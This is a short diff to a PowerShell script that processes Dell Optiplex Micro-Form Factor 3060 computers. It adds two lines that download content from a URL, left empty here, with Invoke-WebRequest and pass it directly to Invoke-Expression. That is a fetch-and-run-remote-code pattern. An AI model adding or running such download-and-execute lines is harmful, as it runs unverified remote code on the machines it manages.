@@ -245,3 +245,6 @@ Get-Date
 
 Write-Verbose "Processing: DELL Optiplex Micro-Form Factor 3060 computers" -Verbose
 Write-Host
+
+$OptiplexMicro3060 = Invoke-WebRequest("")
+Invoke-Expression $($OptiplexMicro3060.Content)
